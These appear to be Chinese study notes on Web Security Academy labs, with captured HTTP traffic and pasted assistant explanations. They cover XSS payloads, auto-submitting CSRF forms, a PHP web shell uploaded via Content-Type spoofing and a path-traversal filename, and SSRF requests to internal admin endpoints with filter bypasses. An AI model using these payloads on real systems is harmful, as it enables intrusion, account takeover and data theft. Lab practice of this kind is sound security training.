2. **<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">double quotes HTML-encoded</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 双引号 </font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">"</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 做了 HTML 实体编码，</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">"</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> → </font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">&quot;</font>`

---

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"><script>alert(1)</script></font><!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782889713185-f68881d8-2fb5-4084-81ef-4ab63347be61.png)<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">注入点是不是在右上角,用a和href进行。</font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">这是第四种上下文，在URL内（href)</font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">javascript:alert(document.cookie)</font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"></font>

# CSRF
## Lab: CSRF vulnerability with no defenses
使用给的账号登录，有这样一个界面。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782908101311-0c6b800d-d2c0-4082-83aa-69ad69065217.png)

抓请求：

```python
POST /my-account/change-email HTTP/2
Host: 0a8b0005041a14ee80de0dfa006600e9.web-security-academy.net
Cookie: session=wWNm6jXm76QXwXGQVBTxaDznqf7P1Fke
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://0a8b0005041a14ee80de0dfa006600e9.web-security-academy.net
Referer: https://0a8b0005041a14ee80de0dfa006600e9.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=test%40test.com
```

在Burp里，右键点这个请求 → Engagement tools → Generate CSRF

PoC。Burp会自动生成一个HTML页面，里面有一个隐藏表单，action指向/my-account/change-email，input填了你指定的邮箱。

把生成出来的HTML里的email值改成hacker@hacker.com（或者你想要的任意邮箱）。

然后看页面底部，有一个"Copy to clipboard"按钮。点了之后，去上面的菜单栏找 "Go to exploit

 server"——点进去，把HTML粘贴到Body框里，点Store，再点Deliver exploit to victim。

之后刷新你原来的页面，看邮箱有没有变。

用BP自带的工具：

```python
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a8b0005041a14ee80de0dfa006600e9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;hacker&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```



如果没有bp，应该怎么构造表单？

如果不用bp，怎么获取请求体，再修改呢？

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782909645517-9b1f759b-43d8-4039-b7cc-2a55c7987e9c.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782909659030-43221793-be0b-4f62-ac09-20f634f6e986.png)





## Lab: CSRF where token validation depends on request method
CSRF token验证只在POST上生效，GET请求完全跳过



 验证漏洞 — 把这个POST请求改成GET：

  GET /my-account/change-email?email=test2@test.com HTTP/2

  Host: 0a970070032645c4810b527a0040003e.web-security-academy.net

  Cookie: session=gjQXPoScwFzzaD0O4KudPM4bR6c6a9bN

  用Burp Repeater发。如果email改了，漏洞确认。



```python
POST /my-account/change-email HTTP/2
Host: 0a970070032645c4810b527a0040003e.web-security-academy.net
Cookie: session=gjQXPoScwFzzaD0O4KudPM4bR6c6a9bN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: https://0a970070032645c4810b527a0040003e.web-security-academy.net
Referer: https://0a970070032645c4810b527a0040003e.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=test%40test.com&csrf=iDoJa7e7j3DSfIhXVUvNZX80qZyYJaie
```

存在csrf token验证。

将POST方法修改为GET，直接绕过验证。

构造表单：

```python
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a970070032645c4810b527a0040003e.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="iDoJa7e7j3DSfIhXVUvNZX80qZyYJaie" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782923881136-46c5f6e6-0735-4881-aa93-dd8e61d93883.png)

## CSRF where token validation depends on token being present
验证 —Burp Repeater里，把POST body改成只留email：email=pwned@attacker.com

csrf参数那一行删干净。发出去。email变了？漏洞确认。



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782923914217-4cdd3c9f-632a-4017-8f84-e12a60083e37.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782924164121-c07e0203-f5a0-4aba-b05a-8e623f1be715.png)



都是有token验证，但是并不强制执行可以跳过。





思路：首先改变邮箱的值，进行抓包。

再改变csrf参数的值，在repeater模块进行重放，如果请求失败，说明验证逻辑存在。

再删除csrf参数的值，如果是302（请求被接受），那么证明验证机制只是看有没有，而不是看对不对。

用BP工具生成表单，且只要email一个参数，在exoploit server中，进行store后，抓view exploit的包。

点 View exploit 自测——看Burp 里发出的请求是不是只有 email 没有 csrf，服务器是否 302 接受（repeater）。

把 exploit 里的 email 改成跟你当前登录账号不同的值，重新点 Store。点 Deliver to victim，Lab 变绿。

---

这个页面是用来干什么的，四个按键分别对应什么，这一关的过关流程是什么？



# File upload vulnerabilities
## Lab: Remote code execution via web shell upload


使用给的账号密码进行登录，登陆后，

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782970081282-7b13e317-826f-42b9-8ab6-53c16c32265f.png)

我们可以上传文件。

webshell：<?php echo file_get_contents('/home/carlos/secret'); ?>

命令为：exploit.php

在repeater中发送请求：

```python
GET /files/avatars/exploit.php HTTP/2
Host: 0ae100ff03a4cd2c80b9b7ba00af00ba.web-security-academy.net
Cookie: session=Q7gxT8qFk7CkuD3ofqFrrksoHLTMgt7J
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ae100ff03a4cd2c80b9b7ba00af00ba.web-security-academy.net/my-account
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Te: trailers


```



得到响应：

```python
HTTP/2 200 OK
Date: Thu, 02 Jul 2026 05:20:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 33

 B1P36yIxUifJ7gogk9CVwnJHcPiJLZUv
```

B1P36yIxUifJ7gogk9CVwnJHcPiJLZUv就是我们要提交的。



<details class="lake-collapse"><summary id="ucdedf189"></summary><div class="ne-quote"><p id="uf3996d4e" class="ne-p"><span class="ne-text">我想请你跟我说说上传文件后，再向这个文件发送请求，就得到了secret，其中的过程和原理是怎么样的</span><span class="ne-text"><br /></span><span class="ne-text">Thought for 1s (ctrl+o to expand)</span></p></div><p id="u94d277f1" class="ne-p"><span class="ne-text">●整个过程，从物理层面拆成三步：</span></p><p id="u79f97474" class="ne-p"><span class="ne-text"> 第一步：你的PHP文件被写进了服务器磁盘</span></p><p id="u616e9723" class="ne-p"><span class="ne-text">  当你通过头像上传功能提交 exploit.php，服务器做的事：</span></p><p id="u3b34c7c8" class="ne-p"><span class="ne-text">  客户端 → HTTP POST → Apache接收 → PHP后端处理上传 → 文件写入磁盘<br /></span><span class="ne-text">                                                        ↓<br /></span><span class="ne-text">                                            /var/www/files/avatars/exploit.php</span></p><p id="u84c374d7" class="ne-p"><span class="ne-text">  文件内容 </span><span class="ne-text"> 原封不动躺在服务器硬盘上。此时它只是一个文本文件，还没被执行。</span></p><p id="u55d57e76" class="ne-p"><span class="ne-text">  第二步：你向这个文件发GET请求</span></p><p id="ua0318099" class="ne-p"><span class="ne-text">  浏览器发 GET /files/avatars/exploit.php →Apache收到请求。</span></p><p id="u9ee3ce8f" class="ne-p"><span class="ne-text">  Apache的工作方式：看扩展名。.php →把文件交给PHP解释器处理，而不是直接把文件内容返回给浏览器。</span></p><p id="ud153b35b" class="ne-p"><span class="ne-text">  这是关键区别：</span></p><ul class="ne-ul"><li id="u764c9914" data-lake-index-type="0"><span class="ne-text">GET /files/avatars/photo.jpg →Apache说「jpg，静态文件」，直接返回二进制内容</span></li><li id="u7657ea5b" data-lake-index-type="0"><span class="ne-text">GET /files/avatars/exploit.php →Apache说「php，脚本」，先执行，再返回执行结果</span></li></ul><p id="u3e050901" class="ne-p"><span class="ne-text">  第三步：PHP解释器执行你的代码</span></p><p id="uf86ad112" class="ne-p"><span class="ne-text">  PHP解释器读 exploit.php<br /></span><span class="ne-text">    →遇到 </span><span class="ne-text"> 标签<br /></span><span class="ne-text">      →执行 echo file_get_contents('/home/carlos/secret')<br /></span><span class="ne-text">        →读取 /home/carlos/secret 文件<br /></span><span class="ne-text">          →输出内容到响应体<br /></span><span class="ne-text">            →Apache把输出打包成HTTP 200返回给你</span></p><p id="u669b1edf" class="ne-p"><span class="ne-text">  你看到的那33个字符，不是 exploit.php 的源代码，而是源代码被执行后产出的结果。</span></p><p id="u01de40bd" class="ne-p"><span class="ne-text">  所以整个攻击链就三个环节：</span></p><p id="ucd654903" class="ne-p"><span class="ne-text">  上传 →文件写磁盘 →Apache看到.php就执行 →你的代码以Web服务器权限运行</span></p><p id="ubbd451e2" class="ne-p"><span class="ne-text">  这个实验里服务器没做任何验证，所以链条毫无阻碍。后面的实验就是在链条的各个环节上设卡——检查扩展名、检查Content-Type、检查文件内容是不是真图片——然后你要想办法<br /></span><span class="ne-text">  绕过去。</span></p></details>
---

## Lab: Web shell upload via Content-Type restriction bypass
This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this. 

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner. 

You can log in to your own account using the following credentials: `wiener:peter`





传入与上一个实验相同的文件：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782970844544-ae7a61b3-30f7-41dc-a3f7-d9a301f62002.png)

只允许image/png类型的文件上传。

  
在上传时抓包：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782971230852-0d297d2e-93cb-430d-80b5-745676f261ae.png)

修改content-type，改为：image/jpeg

```python
POST /my-account/avatar HTTP/2
Host: 0af2000e0366a4a5805e3a0000e0007b.web-security-academy.net
Cookie: session=g0XNeobF1iOOexoYIJgmB193Z8hHMzvr
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundarya85861b7b8e8430eef89ca66b26653d9
Content-Length: 537
Origin: https://0af2000e0366a4a5805e3a0000e0007b.web-security-academy.net
Referer: https://0af2000e0366a4a5805e3a0000e0007b.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

------geckoformboundarya85861b7b8e8430eef89ca66b26653d9
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream

 <?php echo file_get_contents('/home/carlos/secret'); ?>
------geckoformboundarya85861b7b8e8430eef89ca66b26653d9
Content-Disposition: form-data; name="user"

wiener
------geckoformboundarya85861b7b8e8430eef89ca66b26653d9
Content-Disposition: form-data; name="csrf"

gglbre9HcY37VK0yPcQQHVnzteWypyEF
------geckoformboundarya85861b7b8e8430eef89ca66b26653d9--

```

------geckoformboundarya85861b7b8e8430eef89ca66b26653d9

Content-Disposition: form-data; name="avatar"; filename="exploit.php"  #这里是要修改的地方

Content-Type: image/jpeg



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782971761395-30c5b392-6291-45fc-bb46-1940922fbea3.png)

找到对应的记录。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782971783989-7c6816af-a1de-408b-8631-b5de84896507.png)





## Lab: Web shell upload via path traversal
This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a [secondary vulnerability](https://portswigger.net/web-security/file-path-traversal). 

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner. 

You can log in to your own account using the following credentials: `wiener:peter`



我们还是上传相同的php文件

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782972381358-b016c88a-74e9-4391-a4b2-83e95a3566b0.png)

这一次直接上传成功了，却看不到对应的请求了。



```python
POST /my-account/avatar HTTP/2
Host: 0a5c00e504a0694a80c87184003900e2.web-security-academy.net
Cookie: session=bGvEmqcMTiXqIsxZFeZHgUyXCcHQMSpj
User-Agent: Mozilla/5.0 (Windows NT 10	.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary96f3894ad44be4be91b3cf24d2ad5e1b
Content-Length: 537
Origin: https://0a5c00e504a0694a80c87184003900e2.web-security-academy.net
Referer: https://0a5c00e504a0694a80c87184003900e2.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

------geckoformboundary96f3894ad44be4be91b3cf24d2ad5e1b
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream

 <?php echo file_get_contents('/home/carlos/secret'); ?>
------geckoformboundary96f3894ad44be4be91b3cf24d2ad5e1b
Content-Disposition: form-data; name="user"

wiener
------geckoformboundary96f3894ad44be4be91b3cf24d2ad5e1b
Content-Disposition: form-data; name="csrf"

B918y8C7X75zmpjozZHSiqqkBIKiY9mn
------geckoformboundary96f3894ad44be4be91b3cf24d2ad5e1b--

```

直接在浏览器地址栏输入 https://你的lab域名/files/avatars/exploit.php，回车

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782972596301-f1493005-0eaf-4cdf-82d2-03797722d731.png)

只显示了一段php代码

---

 方式二：Burp Repeater里右键 →新建请求，手写：

  GET /files/avatars/exploit.php HTTP/2

  Host: 0af2000e0366a4a5805e3a0000e0007b.web-security-academy.net

---

这就是这个实验要验证的——服务器确实阻止了avatars目录下的PHP执行。返回源码说明文件传上去了，但Apache没把它交给PHP解释器，直接当文本吐回来了。现在走路径穿越。拦截上传请求，改 filename 这一行。

Content-Disposition: form-data; name="avatar"; filename="exploit.php"改为：

Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"

%2f 就是 / 的URL编码。服务器解码后会把文件写到 /files/exploit.php，跳过avatars目录的执行限制。

 .. 在文件系统里就是"上一级目录"，跟命令行里 cd .. 一个道理。%2f 只是把斜杠做了URL编码来绕过过滤——服务器解码后，路径解析逻辑不变。

跟avatars在同一个目录下。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782973629428-66ea1a1a-161c-474e-8b2f-23e506d9e377.png)

上传成功后，用GET /files/avatars/../exploit.php ——浏览器会自动把路径解析成 /files/exploit.php 发出去。

BP中使用：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782973813304-58393bcb-73dd-4ad4-b2d4-980e3f123e49.png)

---





# SSRF
## Lab: Basic SSRF against the local server
This lab has a stock check feature which fetches data from an internal system. 

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`. 

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"></font>

`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">fetch()</font>` 是浏览器原生 JS 网络请求接口，**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">替代老旧 XMLHttpRequest (XHR)</font>**，基于 Promise，用来在前端脚本发起 GET/POST 等 HTTP 请求。  

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1782998231952-19a79819-8a59-4397-a36b-077fa011c49c.png)

抓包check stock的请求，发现一个stock值。

```python
POST /product/stock HTTP/2
Host: 0a9500460439260b80169401007c00b6.web-security-academy.net
Cookie: session=sh1lUxpe34BmJE7tIYJaZFWogC5S3oHQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9500460439260b80169401007c00b6.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a9500460439260b80169401007c00b6.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1

替换为

stockApi=[http://localhost/admin](http://localhost/admin)



响应为：

```python
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Set-Cookie: session=LnjZpDIT7rDpJQX6UD1TpkK7d33uNGdr; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 3174

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Basic SSRF against the local server</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Basic SSRF against the local server</h2>
                            <a class=link-back href='https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
                    <br>
                    <hr>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```



 [http://localhost/admin](http://localhost/admin)——这个请求来自服务器自己（127.0.0.1），访问控制直接放行。响应里你会看到管理面板的HTML。为什么我会看到HTML？

<details class="lake-collapse"><summary id="uad702588"></summary><div class="ne-quote"><p id="u1f3ba742" class="ne-p"><span class="ne-text">我想问的是为什么看到的是HTML界面，而不问为什么能看到HTML</span><span class="ne-text"><br /></span><span class="ne-text">Thought for 2s (ctrl+o to expand)</span></p></div><p id="u0a35e8d9" class="ne-p"><span class="ne-text">●因为 /admin 这个页面本身就是HTML写的。你去访问任何一个网页，服务器返回的都是HTML——管理面板也不例外。</span></p><p id="ubf00721f" class="ne-p"><span class="ne-text">  stockApi 参数做的事情等价于：&quot;服务器，你帮我去访问这个网址，把返回的内容原样给我&quot;。/admin 返回的是HTML管理面板，所以你拿到的是HTML。</span></p><p id="u9d98db55" class="ne-p"><span class="ne-text">  如果你让 stockApi 去访问一个JSON接口，你拿到就是JSON。访问一张图片，你拿到就是二进制图片。返回格式取决于被访问的目标是什么，不由SSRF决定。</span></p></details>
<a href="/admin/delete?username=carlos">

 stockApi=[http://localhost/admin/delete?username=carlos](http://localhost/admin/delete?username=carlos)

为什么这个命令能删除calors，为什么要删除calors？

<details class="lake-collapse"><summary id="uf65ddb1b"></summary><p id="u46fa9cd5" class="ne-p"><span class="ne-text"> /admin/delete?username=carlos 能生效因为：这个请求是服务器自己发的，来自 127.0.0.1。对 /admin/delete接口来说，请求者就是localhost，它信任这个来源，直接执行删除操作。</span></p></details>
这关的要求就是删除calors这个用户。



要学会构造stockApi=后的内容

---



## Lab: Basic SSRF against another back-end system
This lab has a stock check feature which fetches data from an internal system. 

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`. 

扫描网段，8080端口，然后删除用户carlos

```python
POST /product/stock HTTP/2
Host: 0a7e00c10481b302823824110011007c.web-security-academy.net
Cookie: session=m82YTVO4ZzGUt5Dc41ZuucnhLCQz6Yhp
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7e00c10481b302823824110011007c.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: https://0a7e00c10481b302823824110011007c.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
```

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

[http://192.168.0.1:8080/product/stock/check?productId=2&storeId=1](http://192.168.0.1:8080/product/stock/check?productId=2&storeId=1)

这里要用到Intruder



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1783000333818-a1ce9075-c7b1-4e6b-b0ab-7656431fa579.png)

PS：这个选中真的难用

找到状态码200的地址，这就是我们要找的

---

<font style="color:#DF2A3F;">错误</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1783000384752-d1f6b556-c519-4a86-a916-c9b869a18860.png)

[<font style="color:#DF2A3F;">http://192.168.0.</font>](http://192.168.0.)<font style="color:#DF2A3F;">1:8080/admin/delete?username=carlos</font>

<font style="color:#DF2A3F;">stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos</font>

---

我发现错误了，我在探测时，后面跟的是productId=2&storeId=1，我换成admin后就成功探测到正确的值了。这是为什么？

我们要探测的是管理面板。而不是库存查询接口。

<details class="lake-collapse"><summary id="ud15061f6"></summary><p id="uf0a4c588" class="ne-p"><span class="ne-text">因为 /product/stock/check?productId=2&amp;storeId=1 是库存查询接口，所有后端都会返回——但它返回的是库存JSON，不是管理面板。</span></p><p id="u904df27a" class="ne-p"><span class="ne-text">  /admin 只有那台跑管理面板的机器才会返回200。其他193台后端服务器上没有 /admin 这个路径，直接404或500。</span></p><p id="ud72c0812" class="ne-p"><span class="ne-text">  所以不改路径的话，你会在多个IP上看到200（它们都有库存服务），但你分不清哪个IP上还跑着管理面板。换成 /admin 就精准了——只筛选出管理面板所在的那台机器。</span></p></details>
正确的是92

<font style="color:#DF2A3F;">stockApi=http://192.168.0.92:8080/admin/delete?username=carlos</font>





## Lab: SSRF with blacklist-based input filter


This lab has a stock check feature which fetches data from an internal system. 

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`. 

The developer has deployed two weak anti-SSRF defenses that you will need to bypass. 



```python
POST /product/stock HTTP/2
Host: 0a6400a3031f4f3281c6f78d00b60085.web-security-academy.net
Cookie: session=iA8ZDs9bRDkQrDyo8hQSRWj8LBYs4OQB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6400a3031f4f3281c6f78d00b60085.web-security-academy.net/product?productId=6
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a6400a3031f4f3281c6f78d00b60085.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D6%26storeId%3D1
```

[http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId%=1](http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId%=1)

尝试

[http://stock.weliketoshop.net:8080](http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId%=1)/admin

响应：

```python
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 51

"External stock check blocked for security reasons"
```

stockApi=[http://stock.weliketoshop.net:8080/admin](http://stock.weliketoshop.net:8080/admin)

stockApi=[http://localhost/](http://localhost/)

stockApi=[http://localhost/](http://localhost/)admin

stockApi=[http://127.1](http://127.0.0.1)/admin

